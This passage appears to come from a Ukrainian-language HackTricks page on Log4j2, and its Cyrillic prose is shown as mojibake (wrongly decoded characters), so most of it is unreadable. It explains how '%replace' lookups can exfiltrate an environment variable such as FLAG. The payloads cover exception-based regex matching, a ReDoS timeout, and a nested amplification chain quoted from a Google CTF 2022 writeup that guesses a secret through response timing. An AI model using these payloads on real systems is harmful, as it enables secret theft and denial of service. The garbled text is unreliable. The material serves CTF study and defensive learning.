–û–¥–Ω–∞–∫ –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –¥–µ—è–∫—ñ **—à–∞–±–ª–æ–Ω–∏ –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü—ñ—ó, —è–∫—ñ –ø—ñ–¥—Ç—Ä–∏–º—É—é—Ç—å —Ä–µ–≥—É–ª—è—Ä–Ω—ñ –≤–∏—Ä–∞–∑–∏** –¥–ª—è –µ–∫—Å—Ñ—ñ–ª—å—Ç—Ä–∞—Ü—ñ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –∑ –ø–æ—à—É–∫—É –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ä–µ–≥—É–ª—è—Ä–Ω–∏—Ö –≤–∏—Ä–∞–∑—ñ–≤ —Ç–∞ –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è **–±—ñ–Ω–∞—Ä–Ω–∏–º –ø–æ—à—É–∫–æ–º** –∞–±–æ **—á–∞—Å–æ–≤–∏–º–∏** –ø–æ–≤–µ–¥—ñ–Ω–∫–∞–º–∏.

* **–ë—ñ–Ω–∞—Ä–Ω–∏–π –ø–æ—à—É–∫ —á–µ—Ä–µ–∑ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –ø—Ä–æ –≤–∏–Ω—è—Ç–∫–∏**

–®–∞–±–ª–æ–Ω –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü—ñ—ó **`%replace`** –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π –¥–ª—è **–∑–∞–º—ñ–Ω–∏** **–≤–º—ñ—Å—Ç—É** –∑ **—Ä—è–¥–∫–∞** –Ω–∞–≤—ñ—Ç—å –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é **—Ä–µ–≥—É–ª—è—Ä–Ω–∏—Ö –≤–∏—Ä–∞–∑—ñ–≤**. –í—ñ–Ω –ø—Ä–∞—Ü—é—î –Ω–∞—Å—Ç—É–ø–Ω–∏–º —á–∏–Ω–æ–º: `replace{pattern}{regex}{substitution}`\
–ó–ª–æ–≤–∂–∏–≤–∞—é—á–∏ —Ü–∏–º –ø–æ–≤–µ–¥—ñ–Ω–∫–æ—é, –≤–∏ –º–æ–∂–µ—Ç–µ –∑—Ä–æ–±–∏—Ç–∏ –∑–∞–º—ñ–Ω—É **—Å–ø—Ä–æ–≤–æ–∫—É–≤–∞—Ç–∏ –≤–∏–Ω—è—Ç–æ–∫, —è–∫—â–æ —Ä–µ–≥—É–ª—è—Ä–Ω–∏–π –≤–∏—Ä–∞–∑ –≤—ñ–¥–ø–æ–≤—ñ–¥–∞—î** —á–æ–º—É-–Ω–µ–±—É–¥—å —É—Å–µ—Ä–µ–¥–∏–Ω—ñ —Ä—è–¥–∫–∞ (—ñ –∂–æ–¥–Ω–æ–≥–æ –≤–∏–Ω—è—Ç–∫—É, —è–∫—â–æ –π–æ–≥–æ –Ω–µ –∑–Ω–∞–π–¥–µ–Ω–æ) —Ç–∞–∫–∏–º —á–∏–Ω–æ–º:
```bash
%replace{${env:FLAG}}{^CTF.*}{${error}}
# The string searched is the env FLAG, the regex searched is ^CTF.*
## and ONLY if it's found ${error} will be resolved with will trigger an exception
```
* **–ß–∞—Å–æ–≤–∏–π –º–µ—Ç–æ–¥**

–Ø–∫ –±—É–ª–æ –∑–∞–∑–Ω–∞—á–µ–Ω–æ –≤ –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ–º—É —Ä–æ–∑–¥—ñ–ª—ñ, **`%replace`** –ø—ñ–¥—Ç—Ä–∏–º—É—î **—Ä–µ–≥—É–ª—è—Ä–Ω—ñ –≤–∏—Ä–∞–∑–∏**. –¢–∞–∫–∏–º —á–∏–Ω–æ–º, –º–æ–∂–Ω–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è –∑—ñ —Å—Ç–æ—Ä—ñ–Ω–∫–∏ [**ReDoS**](../regular-expression-denial-of-service-redos.md), —â–æ–± –≤–∏–∫–ª–∏–∫–∞—Ç–∏ **—Ç–∞–π–º-–∞—É—Ç**, —è–∫—â–æ –ø—Ä–∞–ø–æ—Ä –∑–Ω–∞–π–¥–µ–Ω–æ.\
–ù–∞–ø—Ä–∏–∫–ª–∞–¥, –Ω–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Ç–∏–ø—É `%replace{${env:FLAG}}{^(?=CTF)((.`_`)`_`)*salt$}{asd}` —Å–ø—Ä–∏—á–∏–Ω–∏—Ç—å **—Ç–∞–π–º-–∞—É—Ç** –Ω–∞ —Ç–æ–º—É CTF.

–£ —Ü—å–æ–º—É [**–æ–ø–∏—Å—ñ**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/), –∑–∞–º—ñ—Å—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –∞—Ç–∞–∫–∏ ReDoS –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞–ª–∞—Å—è **–∞—Ç–∞–∫–∞ –∑ –ø–æ—Å–∏–ª–µ–Ω–Ω—è–º**, —â–æ–± –≤–∏–∫–ª–∏–∫–∞—Ç–∏ —Ä—ñ–∑–Ω–∏—Ü—é —É —á–∞—Å—ñ –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ:

> ```
> /%replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{${ENV:FLAG}}{CTF\{" + flagGuess + ".*\}}{#############################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> ```
>
> –Ø–∫—â–æ –ø—Ä–∞–ø–æ—Ä –ø–æ—á–∏–Ω–∞—î—Ç—å—Å—è –∑ `flagGuess`, –≤–µ—Å—å –ø—Ä–∞–ø–æ—Ä –∑–∞–º—ñ–Ω—é—î—Ç—å—Å—è –Ω–∞ 29 —Å–∏–º–≤–æ–ª—ñ–≤ `#` (—è –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞–≤ —Ü–µ–π —Å–∏–º–≤–æ–ª, –æ—Å–∫—ñ–ª—å–∫–∏ –π–º–æ–≤—ñ—Ä–Ω–æ, –≤—ñ–Ω –Ω–µ –±—É–¥–µ —á–∞—Å—Ç–∏–Ω–æ—é –ø—Ä–∞–ø–æ—Ä–∞). **–ö–æ–∂–µ–Ω –∑ –æ—Ç—Ä–∏–º–∞–Ω–∏—Ö 29 —Å–∏–º–≤–æ–ª—ñ–≤ `#` –ø–æ—Ç—ñ–º –∑–∞–º—ñ–Ω—é—î—Ç—å—Å—è –Ω–∞ 54 —Å–∏–º–≤–æ–ª–∏ `#`**. –¶–µ–π –ø—Ä–æ—Ü–µ—Å –ø–æ–≤—Ç–æ—Ä—é—î—Ç—å—Å—è **6 —Ä–∞–∑—ñ–≤**, —â–æ –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ –∑–∞–≥–∞–ª—å–Ω–æ—ó –∫—ñ–ª—å–∫–æ—Å—Ç—ñ ` 29*54*54^6* =`` `` `**`96816014208`** **—Å–∏–º–≤–æ–ª—ñ–≤ `#`!**
>
> –ó–∞–º—ñ–Ω–∞ —Ç–∞–∫–æ—ó –≤–µ–ª–∏–∫–æ—ó –∫—ñ–ª—å–∫–æ—Å—Ç—ñ —Å–∏–º–≤–æ–ª—ñ–≤ `#` –ø—Ä–∏–∑–≤–µ–¥–µ –¥–æ –≤–∏–∫–ª–∏–∫—É —Ç–∞–π–º-–∞—É—Ç—É –Ω–∞ 10 —Å–µ–∫—É–Ω–¥ —É –¥–æ–¥–∞—Ç–∫—É Flask, —â–æ –≤ —Å–≤–æ—é —á–µ—Ä–≥—É –ø—Ä–∏–∑–≤–µ–¥–µ –¥–æ –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–Ω—è –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–≤—ñ HTTP —Å—Ç–∞—Ç—É—Å –∫–æ–¥—É 500. (–Ø–∫—â–æ –ø—Ä–∞–ø–æ—Ä –Ω–µ –ø–æ—á–∏–Ω–∞—î—Ç—å—Å—è –∑ `flagGuess`, –º–∏ –æ—Ç—Ä–∏–º–∞—î–º–æ —Å—Ç–∞—Ç—É—Å –∫–æ–¥ –Ω–µ 500)

## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* [https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/](https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/)
* [https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/](https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/)
* [https://www.youtube.com/watch?v=XG14EstTgQ4](https://www.youtube.com/watch?v=XG14EstTgQ4)
* [https://tryhackme.com/room/solar](https://tryhackme.com/room/solar)
* [https://www.youtube.com/watch?v=Y8a5nB-vy78](https://www.youtube.com/watch?v=Y8a5nB-vy78)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)
* [https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/)
* [https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/](https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/)

**–ì—Ä—É–ø–∞ –∑ –±–µ–∑–ø–µ–∫–∏ Try Hard Security**

<figure><img src="../../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ —Å–≤–æ—é **–∫–æ–º–ø–∞–Ω—ñ—é —Ä–µ–∫–ª–∞–º–æ–≤–∞–Ω—É –≤ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π –º–µ—Ä—á PEASS & HackTricks**](https://peass.creator-spring.com)
* –î—ñ–∑–Ω–∞–π—Ç–µ—Å—è –ø—Ä–æ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –≤ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ GitHub.

</details>
